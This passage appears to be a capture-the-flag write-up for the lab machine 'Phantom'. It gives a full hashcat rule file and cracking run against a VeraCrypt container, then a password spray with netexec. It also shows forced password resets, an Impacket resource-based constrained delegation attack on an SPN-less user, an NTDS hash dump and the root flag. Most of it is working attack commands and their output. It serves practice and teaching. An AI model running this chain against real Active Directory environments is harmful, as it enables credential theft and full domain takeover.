{{< tag "Decode-company-name-simple-mutation-hashcat-rule" >}} use a short custom wordlist based on company name & simple mutation rules commonly seen in real life passwords (e.g. year & a special character).

{{< /toggle >}}

`phantom_rules.rules`

```
# Hashcat Rules for "Phantom" + Year + Special Character variations
# Base word: Phantom
# Usage: hashcat -r phantom_rules.rule wordlist.txt target_hashes.txt

# Basic transformations
:
l
u
c
C

# Add common years at the end (2020-2025)
$2$0$2$5
$2$0$2$4
$2$0$2$3
$2$0$2$2
$2$0$2$1
$2$0$2$0

# Add years with common special characters (2020-2025)
$2$0$2$5$!
$2$0$2$4$!
$2$0$2$3$!
$2$0$2$2$!
$2$0$2$1$!
$2$0$2$0$!
$2$0$2$5$@
$2$0$2$4$@
$2$0$2$3$@
$2$0$2$2$@
$2$0$2$1$@
$2$0$2$0$@
$2$0$2$5$#
$2$0$2$4$#
$2$0$2$3$#
$2$0$2$2$#
$2$0$2$1$#
$2$0$2$0$#
$2$0$2$5$$
$2$0$2$4$$
$2$0$2$3$$
$2$0$2$2$$
$2$0$2$1$$
$2$0$2$0$$

# Capitalize first letter + years + special chars (2020-2025)
c $2$0$2$5$!
c $2$0$2$4$!
c $2$0$2$3$!
c $2$0$2$2$!
c $2$0$2$1$!
c $2$0$2$0$!

# All uppercase + years + special chars (2020-2025)
u $2$0$2$5$!
u $2$0$2$4$!
u $2$0$2$3$!
u $2$0$2$2$!
u $2$0$2$1$!
u $2$0$2$0$!

# Prepend special characters (2020-2025)
^! $2$0$2$5
^@ $2$0$2$5
^# $2$0$2$5
^$ $2$0$2$5

# Common number substitutions (leet speak) (2020-2025)
so0 $2$0$2$5$!
so0 $2$0$2$4$!
so0 $2$0$2$3$!
so0 $2$0$2$2$!
so0 $2$0$2$1$!
so0 $2$0$2$0$!

# Replace 'a' with '@' (2020-2025)
sa@ $2$0$2$5$!
sa@ $2$0$2$4$!
sa@ $2$0$2$3$!
sa@ $2$0$2$2$!

# Replace 'a' with '4' (2020-2025)
sa4 $2$0$2$5$!
sa4 $2$0$2$4$!
sa4 $2$0$2$3$!
sa4 $2$0$2$2$!
sa4 $2$0$2$1$!
sa4 $2$0$2$0$!

# Multiple leet substitutions (a->4, o->0) (2020-2025)
sa4 so0 $2$0$2$5$!
sa4 so0 $2$0$2$4$!
sa4 so0 $2$0$2$3$!
sa4 so0 $2$0$2$2$!
sa4 so0 $2$0$2$1$!
sa4 so0 $2$0$2$0$!

# Capitalize first + leet substitutions (2020-2025)
c sa4 so0 $2$0$2$5$!
c sa4 so0 $2$0$2$4$!
c sa4 so0 $2$0$2$3$!
c sa4 so0 $2$0$2$2$!
c sa4 so0 $2$0$2$1$!
c sa4 so0 $2$0$2$0$!

# Multiple special characters (2020-2025)
$2$0$2$5$!$!
$2$0$2$4$!$!
$2$0$2$3$!$!
$2$0$2$5$@$!
$2$0$2$4$@$!
$2$0$2$3$@$!
$2$0$2$5$#$!
$2$0$2$4$#$!
$2$0$2$3$#$!

# Years in the middle with special chars at end (2020-2025)
$2$0 $2$5 $!
$2$0 $2$4 $!
$2$0 $2$3 $!
$2$0 $2$2 $!
$2$0 $2$1 $!
$2$0 $2$0 $!

# Short years (last two digits) (20-25)
$2$5$!
$2$4$!
$2$3$!
$2$2$!
$2$1$!
$2$0$!

# Combinations with multiple transformations (2020-2025)
c sa@ $2$0$2$5$!
c so0 $2$0$2$5$!
u sa@ $2$0$2$5$!
u so0 $2$0$2$5$!
c sa4 $2$0$2$5$!
c sa4 $2$0$2$4$!
u sa4 so0 $2$0$2$5$!
u sa4 so0 $2$0$2$4$!

```

```
┌──(root㉿kali)-[~/Desktop]
└─# cat phantom_base_wordlist 
phantom

```

```
┌──(root㉿kali)-[~/Desktop]
└─# hashcat -a 0 IT_BACKUP_201123.hc phantom_base_wordlist -m 13721 -r phantom_rules.rules 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-Intel(R) Core(TM) Ultra 7 255U, 6971/13942 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 128
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 108

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP
* Uses-64-Bit

ATTENTION! Potfile storage is disabled for this hash mode.
Passwords cracked during this session will NOT be stored to the potfile.
Consider using -o to save cracked passwords.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (11109 MB free)

Dictionary cache built:
* Filename..: phantom_base_wordlist
* Passwords.: 1
* Bytes.....: 8
* Keyspace..: 108
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Hashcat is expecting at least 343 base words but only got 0.3% of that.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

IT_BACKUP_201123.hc:Phantom2023!                          
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13721 (VeraCrypt SHA512 + XTS 512 bit (legacy))
Hash.Target......: IT_BACKUP_201123.hc
Time.Started.....: Thu Apr 30 04:07:48 2026 (2 mins, 4 secs)
Time.Estimated...: Thu Apr 30 04:09:52 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-128 bytes)
Guess.Base.......: File (phantom_base_wordlist)
Guess.Mod........: Rules (phantom_rules.rules)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:        0 H/s (0.64ms) @ Accel:343 Loops:500 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 38/108 (35.19%)
Rejected.........: 0/38 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:37-38 Iteration:499500-499999
Candidate.Engine.: Device Generator
Candidates.#01...: Phantom2023! -> Phantom2023!
Hardware.Mon.#01.: Util: 22%

Started: Thu Apr 30 04:06:25 2026
Stopped: Thu Apr 30 04:09:53 2026
                                              
```

```
IT_BACKUP_201123.hc:Phantom2023!                          
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Decode-veracrypt" >}} I’ll download the Ubuntu `.deb` package from the https://veracrypt.io/en/Downloads.html, and install it with `sudo apt install ./veracrypt-1.26.24-Ubuntu-24.04-amd64.deb`. This provides a GUI to load volumes, but I’ll just use the command line:

{{< /toggle >}}

```
oxdf@hacky$ sudo veracrypt IT_BACKUP_201123.hc /mnt/ --password='Phantom2023!'
oxdf@hacky$ ls /mnt/
'$RECYCLE.BIN'         azure_vms_1104.json   splunk_logs_1102             ticketing_system_backup.zip
 azure_vms_0805.json   azure_vms_1123.json   splunk_logs1203              vyos_backup.tar.gz
 azure_vms_1023.json   splunk_logs_1003     'System Volume Information'
```

The various logs are not small. I’ll `grep` for interesting words like “password”, but not find much. I’ll extract the `vyos_backup.tar.gz` and take a look:

`config/config.boot` has a configuration for the system, which includes this section towards the bottom:

{{< code >}}\
vpn {\
sstp {\
authentication {\
local-users {\
username lstanley {\
password "gB6XTcqVP5MlP7Rc"\
}\
}\
mode "local"\
}\
client-ip-pool SSTP-POOL {\
range "10.0.0.2-10.0.0.100"\
}\
default-pool "SSTP-POOL"\
gateway-address "10.0.0.1"\
ssl {\
ca-certificate "CA"\
certificate "Server"\
}\
}\
}\
{{< /code >}}

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-account-verify-nxc" >}} For the winrm , wmi , rdp , need to have the flag of Pwned! which mean to allow to login ; otherwise , it is false positive, but the idap and smb is also normal work.

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto DC.phantom.vl  -u 'lstanley' -p 'gB6XTcqVP5MlP7Rc'; done

[*] Testing smb...
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 

[*] Testing winrm...
WINRM       10.129.234.63   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.234.63   5985   DC               [-] phantom.vl\lstanley:gB6XTcqVP5MlP7Rc

[*] Testing wmi...
RPC         10.129.234.63   135    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)
RPC         10.129.234.63   135    DC               [-] phantom.vl\lstanley:gB6XTcqVP5MlP7Rc (RPC_S_ACCESS_DENIED)

[*] Testing rdp...
RDP         10.129.234.63   3389   DC               [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC) (domain:phantom.vl) (nla:True)
RDP         10.129.234.63   3389   DC               [-] phantom.vl\lstanley:gB6XTcqVP5MlP7Rc (STATUS_LOGON_FAILURE)

[*] Testing ssh...

[*] Testing ldap...
LDAP        10.129.234.63   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)
LDAP        10.129.234.63   389    DC               [-] phantom.vl\lstanley:gB6XTcqVP5MlP7Rc 

[*] Testing mssql...

[*] Testing ftp...


```

try this password with other users

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.234.63  -u ./username.txt  -p  'gB6XTcqVP5MlP7Rc' --continue-on-success   --no-bruteforce | grep '[+]' 
SMB                      10.129.234.63   445    DC               [+] phantom.vl\EnterpriseRead-onlyDomainControllers:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DomainAdmins:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DomainUsers:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DomainGuests:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DomainComputers:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DomainControllers:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\CertPublishers:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\SchemaAdmins:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\EnterpriseAdmins:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\GroupPolicyCreatorOwners:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\Read-onlyDomainControllers:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\CloneableDomainControllers:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\ProtectedUsers:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\KeyAdmins:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\EnterpriseKeyAdmins:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\RASandIASServers:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\AllowedRODCPasswordReplicationGroup:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DeniedRODCPasswordReplicationGroup:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DnsAdmins:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DnsUpdateProxy:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc 
SMB                      10.129.234.63   445    DC               [+] phantom.vl\TechSupports:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\ServerAdmins:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\ICTSecurity:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\DevOps:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\Accountants:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\FinManagers:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\EmployeeRelations:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\HRManagers:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\SSPRService:gB6XTcqVP5MlP7Rc (Guest)
SMB                      10.129.234.63   445    DC               [+] phantom.vl\:gB6XTcqVP5MlP7Rc (Guest)

```

svc\_sspr:gB6XTcqVP5MlP7Rc

! the winrm has the pwn3d!

```
┌──(root㉿kali)-[~/Desktop]
└─# for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto DC.phantom.vl  -u 'svc_sspr' -p 'gB6XTcqVP5MlP7Rc'; done

[*] Testing smb...
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc 

[*] Testing winrm...
WINRM       10.129.234.63   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.234.63   5985   DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc (Pwn3d!)

[*] Testing wmi...
RPC         10.129.234.63   135    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)
RPC         10.129.234.63   135    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc 

[*] Testing rdp...
RDP         10.129.234.63   3389   DC               [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC) (domain:phantom.vl) (nla:True)
RDP         10.129.234.63   3389   DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc 

[*] Testing ssh...

[*] Testing ldap...
LDAP        10.129.234.63   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)
LDAP        10.129.234.63   389    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc 

[*] Testing mssql...


```

### ForceChangePassword

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-vectory-ForceChangePassword" >}} I’ll use the `change-password` module in `netexec` to update wsilva’s password

{{< /toggle >}}

![Pasted image 20260430162511.png](/ob/Pasted%20image%2020260430162511.png)

I’ll mark ibryant as owned, but there’s nothing interesting about them.

I’ll mark svc\_sspr as owned, and it has `ForceChangePassword` over three accounts:

The pre-built query “Shortest paths from Owned object to Tier Zero” (which you always have to uncomment before running) shows a clear path to full domain control:

```
┌──(root㉿kali)-[~/Desktop]
└─# nxc  smb dc.phantom.vl   -u svc_sspr   -p  'gB6XTcqVP5MlP7Rc' -M change-password -o USER=WSILVA  NEWPASS=0xdf0xdf 
[*] Initializing SMB protocol database
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc 
CHANGE-P... 10.129.234.63   445    DC               [+] Successfully changed password for WSILVA
                                                                                                        
```

### AddAllowedToAct

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-vectory-AddAllowedToAct  " >}} Discover the AddAllowedToAct on bloodhound that really means that this user can edit the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute on the computer object. This is how resource-based constrained delegation is configured. I set this property on one server saying that another service (user) can authenticate on behalf of other users.

{{< /toggle >}}

```
└─# nxc ldap  dc.phantom.vl   -u svc_sspr   -p  'gB6XTcqVP5MlP7Rc' -M maq
[*] Initializing LDAP protocol database
LDAP        10.129.234.63   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.234.63   389    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc 
MAQ         10.129.234.63   389    DC               [*] Getting the MachineAccountQuota
MAQ         10.129.234.63   389    DC               MachineAccountQuota: 0

```

To exploit this, typically it requires a user with a service principal name (SPN). This is most commonly exploited by creating a computer object, as the default AD configuration allows any user to add up to ten computers to the domain. However, on Phantom the machine account quota is set to 0:

Basically, if I can set a user’s password such that their NTLM hash matches the TGT session key on the DC, all the crypto will work out that the attack works. The steps to run this attack from a Linux host are outlined [on The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users). All of the Python scripts in the following sections come from [Impacket](https://github.com/SecureAuthCorp/impacket), installed with `uv tool install impacket` ([uv cheatsheet](https://0xdf.gitlab.io/cheatsheets/uv#)).

First I’lll add wsilva as the account that can act on behalf of others to DC\$ using `rbcd.py`:

```
┌──(root㉿kali)-[~/Desktop]
└─# locate rbcd.py 
/home/kali/.cache/uv/archive-v0/YT8sqWT3bWxNQNAsKLlIE/impacket-0.14.0.dev0+20260226.31512.9d3d86ea.data/scripts/rbcd.py
/home/kali/.cache/uv/git-v0/checkouts/66325c558242afca/9d3d86ea/build/scripts-3.13/rbcd.py
/home/kali/.cache/uv/git-v0/checkouts/66325c558242afca/9d3d86ea/examples/rbcd.py
/opt/py_env/bin/rbcd.py
/usr/share/doc/python3-impacket/examples/rbcd.py
                                                                                                                                                                                                      
┌──(root㉿kali)-[~/Desktop]
└─# /usr/share/doc/python3-impacket/examples/rbcd.py -delegate-to 'DC$' -delegate-from wsilva -action write phantom/wsilva:0xdf0xdf  -dc-ip 10.129.203.172
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] wsilva can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     wsilva       (S-1-5-21-4029599044-1972224926-2225194048-1114)

```

I’ll get a TGT as wsilva using `getTGT.py`

```
┌──(root㉿kali)-[~/Desktop]
└─# /usr/share/doc/python3-impacket/examples/getTGT.py phantom.vl/wsilva:0xdf0xdf 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in wsilva.ccache

```

I need to get the wsilva user’s password to have an NTLM hash matching the session key. That key is in the ticket I just requested:

```
┌──(root㉿kali)-[~/Desktop]
└─# locate describeTicket.py  
/home/kali/.cache/uv/archive-v0/YT8sqWT3bWxNQNAsKLlIE/impacket-0.14.0.dev0+20260226.31512.9d3d86ea.data/scripts/describeTicket.py
/home/kali/.cache/uv/git-v0/checkouts/66325c558242afca/9d3d86ea/build/scripts-3.13/describeTicket.py
/home/kali/.cache/uv/git-v0/checkouts/66325c558242afca/9d3d86ea/examples/describeTicket.py
/opt/py_env/bin/describeTicket.py
/usr/share/doc/python3-impacket/examples/describeTicket.py
                                                                                                                                                                                                      
┌──(root㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─#  /usr/share/doc/python3-impacket/examples/describeTicket.py wsilva.ccache
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : ddfe04dd7b01350adb3cf04595183568
[*] User Name                     : wsilva
[*] User Realm                    : PHANTOM.VL
[*] Service Name                  : krbtgt/PHANTOM.VL
[*] Service Realm                 : PHANTOM.VL
[*] Start Time                    : 30/04/2026 05:21:27 AM
[*] End Time                      : 30/04/2026 15:21:27 PM
[*] RenewTill                     : 01/05/2026 05:21:27 AM
[*] Flags                         : (0x50e10000) forwardable, proxiable, renewable, initial, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : 3f4E3XsBNQrbPPBFlRg1aA==
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : krbtgt/PHANTOM.VL
[*]   Service Realm               : PHANTOM.VL
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied


```

`changepasswd.py` allows setting the password by hash: , change the vault \[\*] Ticket Session Key            : ddfe04dd7b01350adb3cf04595183568

```
┌──(root㉿kali)-[~/Desktop]
└─# locate changepasswd.py 
/home/kali/.cache/uv/archive-v0/YT8sqWT3bWxNQNAsKLlIE/impacket-0.14.0.dev0+20260226.31512.9d3d86ea.data/scripts/changepasswd.py
/home/kali/.cache/uv/git-v0/checkouts/66325c558242afca/9d3d86ea/build/scripts-3.13/changepasswd.py
/home/kali/.cache/uv/git-v0/checkouts/66325c558242afca/9d3d86ea/examples/changepasswd.py
/opt/py_env/bin/changepasswd.py
/usr/share/doc/python3-impacket/examples/changepasswd.py
                                                                                                                                                                                                                                                                                 
┌──(root㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─# /usr/share/doc/python3-impacket/examples/changepasswd.py -newhashes :ddfe04dd7b01350adb3cf04595183568 phantom/wsilva:0xdf0xdf@dc.phantom.vl
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of phantom\wsilva
[*] Connecting to DCE/RPC as phantom\wsilva
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).


```

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo apt install ntpsec-ntpdate
The following packages were automatically installed and are no longer required:

```

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo ntpdate DC.phantom.vl                                                                                                                                       
2026-04-30 04:50:21.691296 (-0400) -0.202583 +/- 0.022087 DC.phantom.vl 10.129.234.63 s1 no-leap
                                                            
```

```
┌──(root㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─# KRB5CCNAME=wsilva.ccache /usr/share/doc/python3-impacket/examples/getST.py  -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache


```

```
┌──(root㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─# KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache netexec smb dc.phantom.vl --use-kcache
SMB         dc.phantom.vl   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.phantom.vl   445    DC               [+] phantom.vl\Administrator from ccache (Pwn3d!)
```

```
┌──(root㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─# KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache netexec smb dc.phantom.vl --use-kcache --ntds --user Administrator
SMB         dc.phantom.vl   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.phantom.vl   445    DC               [+] phantom.vl\Administrator from ccache (Pwn3d!)
SMB         dc.phantom.vl   445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc.phantom.vl   445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa2abd9db4f5984e657f834484512117:::
SMB         dc.phantom.vl   445    DC               [+] Dumped 1 NTDS hashes to /root/.nxc/logs/ntds/DC_dc.phantom.vl_2026-04-30_052449.ntds of which 1 were added to the database
SMB         dc.phantom.vl   445    DC               [*] To extract only enabled accounts from the output file, run the following command: 
SMB         dc.phantom.vl   445    DC               [*] grep -iv disabled /root/.nxc/logs/ntds/DC_dc.phantom.vl_2026-04-30_052449.ntds | cut -d ':' -f1

```

```
evil-winrm-py PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----          7/4/2024   7:22 AM           2308 Microsoft Edge.lnk                                                    
-ar---         4/30/2026   2:10 AM             34 root.txt                                                              


evil-winrm-py PS C:\Users\Administrator\Desktop> type root.txt
4b778628e3814d1bacc9d84e5caa2f3a
evil-winrm-py PS C:\Users\Administrator\Desktop>

```
